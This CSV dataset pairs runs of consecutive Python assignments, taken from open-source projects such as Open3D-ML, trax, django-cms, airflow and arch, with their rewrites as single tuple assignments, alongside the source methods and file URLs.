repo_name,file_html,class_name,me_name,me_code,old_code,new_code
Open3D-ML,https://github.com/isl-org/Open3D-ML/tree/master/ml3d/torch/models/kpconv.py,,global_average$863,"def global_average(x, batch_lengths):
    """"""Block performing a global average over batch pooling.

    Args:
        x: [N, D] input features
        batch_lengths: [B] list of batch lengths

    Returns:
        [B, D] averaged features
    """"""
    # Loop over the clouds of the batch
    averaged_features = []
    i0 = 0
    for b_i, length in enumerate(batch_lengths):

        # Average features for each batch cloud
        averaged_features.append(torch.mean(x[i0:i0 + length], dim=0))

        # Increment for next cloud
        i0 += length

    # Average features in each batch
    return torch.stack(averaged_features)","averaged_features = []
i0 = 0","averaged_features , i0  = [], 0"
trax,https://github.com/google/trax/tree/master/trax/tf_numpy/numpy_impl/math_ops.py,,f$765,"def f(a):
    nd = a.shape.rank
    if (axis + nd if axis < 0 else axis) >= nd:
      raise ValueError(""axis %s is out of bounds for array of dimension %s"" %
                       (axis, nd))
    if n < 0:
      raise ValueError(""order must be non-negative but got %s"" % n)
    slice1 = [slice(None)] * nd
    slice2 = [slice(None)] * nd
    slice1[axis] = slice(1, None)
    slice2[axis] = slice(None, -1)
    slice1 = tuple(slice1)
    slice2 = tuple(slice2)
    op = tf.not_equal if a.dtype == tf.bool else tf.subtract
    for _ in range(n):
      a = op(a[slice1], a[slice2])
    return a","slice1 = tuple(slice1)
slice2 = tuple(slice2)
op = tf.not_equal if a.dtype == tf.bool else tf.subtract","slice1 , slice2 , op  = tuple(slice1), tuple(slice2), tf.not_equal if a.dtype == tf.bool else tf.subtract"
text_classification,https://github.com/brightmart/text_classification/tree/master/a04_TextRCNN/p71_TextRCNN_mode2.py,,test$195,"def test():
    #below is a function test; if you use this for text classifiction, you need to tranform sentence to indices of vocabulary first. then feed data to the graph.
    num_classes=10
    learning_rate=0.01
    batch_size=8
    decay_steps=1000
    decay_rate=0.9
    sequence_length=5
    vocab_size=10000
    embed_size=100
    is_training=True
    dropout_keep_prob=1#0.5
    textRNN=TextRCNN(num_classes, learning_rate, batch_size, decay_steps, decay_rate,sequence_length,vocab_size,embed_size,is_training)
    with tf.Session() as sess:
        sess.run(tf.global_variables_initializer())
        for i in range(100):
            input_x=np.zeros((batch_size,sequence_length)) #[None, self.sequence_length]
            input_y=input_y=np.array([1,0,1,1,1,2,1,1]) #np.zeros((batch_size),dtype=np.int32) #[None, self.sequence_length]
            loss,acc,predict,_=sess.run([textRNN.loss_val,textRNN.accuracy,textRNN.predictions,textRNN.train_op],
                                        feed_dict={textRNN.input_x:input_x,textRNN.input_y:input_y,textRNN.dropout_keep_prob:dropout_keep_prob})
            print(""loss:"",loss,""acc:"",acc,""label:"",input_y,""prediction:"",predict)","num_classes = 10
learning_rate = 0.01
batch_size = 8
decay_steps = 1000
decay_rate = 0.9
sequence_length = 5
vocab_size = 10000
embed_size = 100
is_training = True","num_classes , learning_rate , batch_size , decay_steps , decay_rate , sequence_length , vocab_size , embed_size , is_training  = 10, 0.01, 8, 1000, 0.9, 5, 10000, 100, True"
text_classification,https://github.com/brightmart/text_classification/tree/master/a04_TextRCNN/p71_TextRCNN_mode2.py,,test$195,"def test():
    #below is a function test; if you use this for text classifiction, you need to tranform sentence to indices of vocabulary first. then feed data to the graph.
    num_classes=10
    learning_rate=0.01
    batch_size=8
    decay_steps=1000
    decay_rate=0.9
    sequence_length=5
    vocab_size=10000
    embed_size=100
    is_training=True
    dropout_keep_prob=1#0.5
    textRNN=TextRCNN(num_classes, learning_rate, batch_size, decay_steps, decay_rate,sequence_length,vocab_size,embed_size,is_training)
    with tf.Session() as sess:
        sess.run(tf.global_variables_initializer())
        for i in range(100):
            input_x=np.zeros((batch_size,sequence_length)) #[None, self.sequence_length]
            input_y=input_y=np.array([1,0,1,1,1,2,1,1]) #np.zeros((batch_size),dtype=np.int32) #[None, self.sequence_length]
            loss,acc,predict,_=sess.run([textRNN.loss_val,textRNN.accuracy,textRNN.predictions,textRNN.train_op],
                                        feed_dict={textRNN.input_x:input_x,textRNN.input_y:input_y,textRNN.dropout_keep_prob:dropout_keep_prob})
            print(""loss:"",loss,""acc:"",acc,""label:"",input_y,""prediction:"",predict)","dropout_keep_prob = 1
textRNN = TextRCNN(num_classes, learning_rate, batch_size, decay_steps, decay_rate, sequence_length, vocab_size, embed_size, is_training)","dropout_keep_prob , textRNN  = 1, TextRCNN(num_classes, learning_rate, batch_size, decay_steps, decay_rate, sequence_length, vocab_size, embed_size, is_training)"
django-cms,https://github.com/django-cms/django-cms/tree/master/cms/tests/test_admin.py,AdminTests,test_change_innavigation$503,"def test_change_innavigation(self):
        page = self.get_page()
        permless = self.get_permless()
        admin_user = self.get_admin()
        with self.login_user_context(permless):
            request = self.get_request()
            response = self.admin_class.change_innavigation(request, page.pk)
            self.assertEqual(response.status_code, 405)
        with self.login_user_context(permless):
            request = self.get_request(post_data={'no': 'data'})
            response = self.admin_class.change_innavigation(request, page.pk)
            self.assertEqual(response.status_code, 403)
        with self.login_user_context(permless):
            request = self.get_request(post_data={'no': 'data'})
            self.assertEqual(response.status_code, 403)
        with self.login_user_context(admin_user):
            request = self.get_request(post_data={'no': 'data'})
            self.assertRaises(Http404, self.admin_class.change_innavigation,
                              request, page.pk + 100)
        with self.login_user_context(permless):
            request = self.get_request(post_data={'no': 'data'})
            response = self.admin_class.change_innavigation(request, page.pk)
            self.assertEqual(response.status_code, 403)
        with self.login_user_context(admin_user):
            request = self.get_request(post_data={'no': 'data'})
            old = page.in_navigation
            response = self.admin_class.change_innavigation(request, page.pk)
            self.assertEqual(response.status_code, 204)
            page = self.reload(page)
            self.assertEqual(old, not page.in_navigation)","page = self.get_page()
permless = self.get_permless()
admin_user = self.get_admin()","page , permless , admin_user  = self.get_page(), self.get_permless(), self.get_admin()"
django-cms,https://github.com/django-cms/django-cms/tree/master/cms/tests/test_admin.py,AdminTests,test_change_innavigation$503,"def test_change_innavigation(self):
        page = self.get_page()
        permless = self.get_permless()
        admin_user = self.get_admin()
        with self.login_user_context(permless):
            request = self.get_request()
            response = self.admin_class.change_innavigation(request, page.pk)
            self.assertEqual(response.status_code, 405)
        with self.login_user_context(permless):
            request = self.get_request(post_data={'no': 'data'})
            response = self.admin_class.change_innavigation(request, page.pk)
            self.assertEqual(response.status_code, 403)
        with self.login_user_context(permless):
            request = self.get_request(post_data={'no': 'data'})
            self.assertEqual(response.status_code, 403)
        with self.login_user_context(admin_user):
            request = self.get_request(post_data={'no': 'data'})
            self.assertRaises(Http404, self.admin_class.change_innavigation,
                              request, page.pk + 100)
        with self.login_user_context(permless):
            request = self.get_request(post_data={'no': 'data'})
            response = self.admin_class.change_innavigation(request, page.pk)
            self.assertEqual(response.status_code, 403)
        with self.login_user_context(admin_user):
            request = self.get_request(post_data={'no': 'data'})
            old = page.in_navigation
            response = self.admin_class.change_innavigation(request, page.pk)
            self.assertEqual(response.status_code, 204)
            page = self.reload(page)
            self.assertEqual(old, not page.in_navigation)","old = page.in_navigation
response = self.admin_class.change_innavigation(request, page.pk)","old , response  = page.in_navigation, self.admin_class.change_innavigation(request, page.pk)"
airflow,https://github.com/apache/airflow/tree/master/airflow/providers/amazon/aws/operators/dms_stop_task.py,DmsStopTaskOperator,__init__$43,"def __init__(
        self,
        *,
        replication_task_arn: Optional[str] = None,
        aws_conn_id: str = 'aws_default',
        **kwargs,
    ):
        super().__init__(**kwargs)
        self.replication_task_arn = replication_task_arn
        self.aws_conn_id = aws_conn_id","self.replication_task_arn = replication_task_arn
self.aws_conn_id = aws_conn_id","self.replication_task_arn , self.aws_conn_id  = replication_task_arn, aws_conn_id"
arch,https://github.com/bashtage/arch/tree/master/arch/tests/unitroot/test_unitroot.py,TestUnitRoot,test_variance_ratio$220,"def test_variance_ratio(self):
        vr = VarianceRatio(self.inflation, debiased=False)
        y = self.inflation
        dy = np.diff(y)
        mu = dy.mean()
        dy2 = y[2:] - y[:-2]
        nq = dy.shape[0]
        denom = np.sum((dy - mu) ** 2.0) / nq
        num = np.sum((dy2 - 2 * mu) ** 2.0) / (nq * 2)
        ratio = num / denom

        assert_almost_equal(ratio, vr.vr)
        assert ""Variance-Ratio Test"" in str(vr)
        vr = VarianceRatio(self.inflation, debiased=True)
        assert vr.debiased is True","vr = VarianceRatio(self.inflation, debiased=False)
y = self.inflation","vr , y  = VarianceRatio(self.inflation, debiased=False), self.inflation"
arch,https://github.com/bashtage/arch/tree/master/arch/tests/unitroot/test_unitroot.py,TestUnitRoot,test_variance_ratio$220,"def test_variance_ratio(self):
        vr = VarianceRatio(self.inflation, debiased=False)
        y = self.inflation
        dy = np.diff(y)
        mu = dy.mean()
        dy2 = y[2:] - y[:-2]
        nq = dy.shape[0]
        denom = np.sum((dy - mu) ** 2.0) / nq
        num = np.sum((dy2 - 2 * mu) ** 2.0) / (nq * 2)
        ratio = num / denom

        assert_almost_equal(ratio, vr.vr)
        assert ""Variance-Ratio Test"" in str(vr)
        vr = VarianceRatio(self.inflation, debiased=True)
        assert vr.debiased is True","mu = dy.mean()
dy2 = y[2:] - y[:-2]
nq = dy.shape[0]","mu , dy2 , nq  = dy.mean(), y[2:] - y[:-2], dy.shape[0]"
arch,https://github.com/bashtage/arch/tree/master/arch/tests/unitroot/test_unitroot.py,TestUnitRoot,test_variance_ratio$220,"def test_variance_ratio(self):
        vr = VarianceRatio(self.inflation, debiased=False)
        y = self.inflation
        dy = np.diff(y)
        mu = dy.mean()
        dy2 = y[2:] - y[:-2]
        nq = dy.shape[0]
        denom = np.sum((dy - mu) ** 2.0) / nq
        num = np.sum((dy2 - 2 * mu) ** 2.0) / (nq * 2)
        ratio = num / denom

        assert_almost_equal(ratio, vr.vr)
        assert ""Variance-Ratio Test"" in str(vr)
        vr = VarianceRatio(self.inflation, debiased=True)
        assert vr.debiased is True","denom = np.sum((dy - mu) ** 2.0) / nq
num = np.sum((dy2 - 2 * mu) ** 2.0) / (nq * 2)","denom , num  = np.sum((dy - mu) ** 2.0) / nq, np.sum((dy2 - 2 * mu) ** 2.0) / (nq * 2)"
